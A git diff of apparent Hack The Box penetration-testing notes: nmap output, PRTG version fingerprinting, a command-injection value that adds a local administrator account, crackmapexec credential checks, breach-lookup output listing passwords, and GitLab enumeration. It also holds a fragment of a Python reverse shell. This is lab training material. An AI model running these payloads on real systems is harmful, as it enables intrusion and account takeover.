@@ -1089,29 +1089,121 @@ s.connect((ip,int(port)))
 [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
 pty.spawn('/bin/bash')
 ```
+## PRTG Network Monitor
+
 ```
-1
+mdmithu@htb[/htb]$ sudo nmap -sV -p- --open -T4 10.129.201.50
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-22 15:41 EDT
+Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 0.06% done
+Nmap scan report for 10.129.201.50
+Host is up (0.11s latency).
+Not shown: 65492 closed ports, 24 filtered ports
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+8000/tcp  open  ssl/http      Splunkd httpd
+8080/tcp  open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
+8089/tcp  open  ssl/http      Splunkd httpd
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49676/tcp open  msrpc         Microsoft Windows RPC
+49677/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 ```
-1
+mdmithu@htb[/htb]$ curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
+
+  <link rel="stylesheet" type="text/css" href="/css/prtgmini.css?prtgversion=17.3.33.2830__" media="print,screen,projection" />
+<div><h3><a target="_blank" href="https://blog.paessler.com/new-prtg-release-21.3.70-with-new-azure-hpe-and-redfish-sensors">New PRTG release 21.3.70 with new Azure, HPE, and Redfish sensors</a></h3><p>Just a short while ago, I introduced you to PRTG Release 21.3.69, with a load of new sensors, and now the next version is ready for installation. And this version also comes with brand new stuff!</p></div>
+    <span class="prtgversion">&nbsp;PRTG Network Monitor 17.3.33.2830 </span>
 ```
 ```
-1
+test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
 ```
 ```
-1
+mdmithu@htb[/htb]$ sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG! 
+
+SMB         10.129.201.50   445    APP03            [*] Windows 10.0 Build 17763 (name:APP03) (domain:APP03) (signing:False) (SMBv1:False)
+SMB         10.129.201.50   445    APP03            [+] APP03\prtgadm1:Pwn3d_by_PRTG! (Pwn3d!)
+```
+## osTicket
+(https://dehashed.com/)['https://dehashed.com/']
+```
+mdmithu@htb[/htb]$ sudo python3 dehashed.py -q inlanefreight.local -p
+
+id : 5996447501
+email : julie.clayton@inlanefreight.local
+username : jclayton
+password : JulieC8765!
+hashed_password : 
+name : Julie Clayton
+vin : 
+address : 
+phone : 
+database_name : ModBSolutions
+
+
+id : 7344467234
+email : kevin@inlanefreight.local
+username : kgrimes
+password : Fish1ng_s3ason!
+hashed_password : 
+name : Kevin Grimes
+vin : 
+address : 
+phone : 
+database_name : MyFitnessPal
+
+<SNIP>
 ```
 ```
-1
+mdmithu@htb[/htb]$ cat ilfreight_subdomains
+
+vpn.inlanefreight.local
+support.inlanefreight.local
+ns1.inlanefreight.local
+mail.inlanefreight.local
+apps.inlanefreight.local
+ftp.inlanefreight.local
+dev.inlanefreight.local
+ir.inlanefreight.local
+auth.inlanefreight.local
+careers.inlanefreight.local
+portal-stage.inlanefreight.local
+dns1.inlanefreight.local
+dns2.inlanefreight.local
+meet.inlanefreight.local
+portal-test.inlanefreight.local
+home.inlanefreight.local
+legacy.inlanefreight.local
+
 ```
+## Gitlab - Discovery & Enumeration
+
 ```
-1
+http://gitlab.inlanefreight.local:8081/admin/application_settings/general
+http://gitlab.inlanefreight.local:8081/users/sign_in
+http://gitlab.inlanefreight.local:8081/root/inlanefreight-dev
+
 ```
+#### Enumeration
+
 ```
-1
-```
-```
-1
+mdmithu@htb[/htb]$ http://gitlab.inlanefreight.local:8081/explore
+
 ```
 ```
 1
